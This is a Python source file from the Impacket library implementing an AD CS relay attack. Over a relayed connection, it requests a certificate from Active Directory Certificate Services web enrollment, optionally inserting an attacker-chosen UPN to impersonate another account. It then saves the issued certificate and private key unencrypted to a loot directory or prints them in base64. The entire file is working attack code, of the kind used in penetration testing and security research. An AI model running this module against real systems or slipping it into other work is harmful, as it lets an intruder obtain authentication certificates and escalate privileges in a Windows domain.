# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   AD CS relay attack
#
# Authors:
#   Ex Android Dev (@ExAndroidDev)
#   Tw1sm (@Tw1sm)

import re
import base64
import os
from OpenSSL import crypto

from cryptography import x509
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.hazmat.primitives.serialization import NoEncryption
from cryptography.x509 import ExtensionNotFound, load_pem_x509_certificate
from cryptography.x509.oid import NameOID, ObjectIdentifier
from cryptography.hazmat.backends import default_backend



from impacket import LOG

# cache already attacked clients
ELEVATED = []


class ADCSAttack:
    UPN_OID = ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")

    def _run(self):
        key = crypto.PKey()
        key.generate_key(crypto.TYPE_RSA, 4096)

        if self.username in ELEVATED:
            LOG.info('Skipping user %s since attack was already performed' % self.username)
            return

        current_template = self.config.template
        if current_template is None:
            current_template = "Machine" if self.username.endswith("$") else "User"

        csr = self.generate_csr(key, self.username, self.config.altName)
        csr = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")
        LOG.info("CSR generated!")

        certAttrib = self.generate_certattributes(current_template, self.config.altName)

        data = "Mode=newreq&CertRequest=%s&CertAttrib=%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=" % (csr, certAttrib)

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": len(data)
        }

        LOG.info("Getting certificate...")

        self.client.request("POST", "/certsrv/certfnsh.asp", body=data, headers=headers)
        ELEVATED.append(self.username)
        response = self.client.getresponse()

        if response.status != 200:
            LOG.error("Error getting certificate! Make sure you have entered valid certificate template.")
            return

        content = response.read()
        found = re.findall(r'location="certnew.cer\?ReqID=(.*?)&', content.decode())
        if len(found) == 0:
            LOG.error("Error obtaining certificate!")
            return

        certificate_id = found[0]

        self.client.request("GET", "/certsrv/certnew.cer?ReqID=" + certificate_id)
        response = self.client.getresponse()

        LOG.info("GOT CERTIFICATE! ID %s" % certificate_id)
        certificate = response.read().decode()

        cert_obj = load_pem_x509_certificate(certificate.encode(), backend=default_backend())
        pfx_filename = self._sanitize_filename(self.username or self._extract_certificate_identity(cert_obj) or "certificate_{0}".format(certificate_id))
        certificate_store = self.generate_pfx(key.to_cryptography_key(), cert_obj)
        output_path = os.path.join(self.config.lootdir, "{}.pfx".format(pfx_filename))
        LOG.info("Writing PKCS#12 certificate to %s" % output_path)
        try:
            if not os.path.isdir(self.config.lootdir):
                os.mkdir(self.config.lootdir)
            with open(output_path, 'wb') as f:
                f.write(certificate_store)
            LOG.info("Certificate successfully written to file")
        except Exception as e:
            LOG.info("Unable to write certificate to file, printing B64 of certificate to console instead")
            LOG.info("Base64-encoded PKCS#12 certificate (%s): \n%s" % (pfx_filename, base64.b64encode(certificate_store).decode()))
            pass

        if self.config.altName:
            LOG.info("This certificate can also be used for user : {}".format(self.config.altName))

    @staticmethod
    def generate_csr(key, CN, altName, csr_type = crypto.FILETYPE_PEM):
        LOG.info("Generating CSR...")
        req = crypto.X509Req()

        if CN:
            req.get_subject().CN = CN

        if altName:
            req.add_extensions([crypto.X509Extension(b"subjectAltName", False, b"otherName:1.3.6.1.4.1.311.20.2.3;UTF8:%b" %  altName.encode() )])

        req.set_pubkey(key)
        req.sign(key, "sha256")

        return crypto.dump_certificate_request(csr_type, req)

    @staticmethod
    def generate_pfx(key, certificate):
        pfx_data = pkcs12.serialize_key_and_certificates(
            name=b"",
            key=key,
            cert=certificate,
            cas=None,
            encryption_algorithm=NoEncryption()
        )
        
        return pfx_data
    
    @staticmethod
    def generate_certattributes(template, altName):
        if altName:
            return "CertificateTemplate:{}%0d%0aSAN:upn={}".format(template, altName)
        return "CertificateTemplate:{}".format(template)

    @classmethod
    def _extract_certificate_identity(cls, cert):
        try:
            common_names = cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)
            for attribute in common_names:
                value = attribute.value.strip()
                if value:
                    return value
        except Exception:
            pass

        try:
            san_extension = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
            san = san_extension.value
            for other_name in san.get_values_for_type(x509.OtherName):
                if other_name.type_id == cls.UPN_OID:
                    value = other_name.value
                    if isinstance(value, bytes):
                        value = value.decode('utf-8', errors='ignore')
                    value = value.strip()
                    if value:
                        return value
            for dns_name in san.get_values_for_type(x509.DNSName):
                value = dns_name.strip()
                if value:
                    return value
        except ExtensionNotFound:
            pass
        except Exception:
            pass

        return None

    @staticmethod
    def _sanitize_filename(name):
        sanitized = re.sub(r'[^A-Za-z0-9._-]', '_', name)
        sanitized = sanitized.strip("._")
        return sanitized
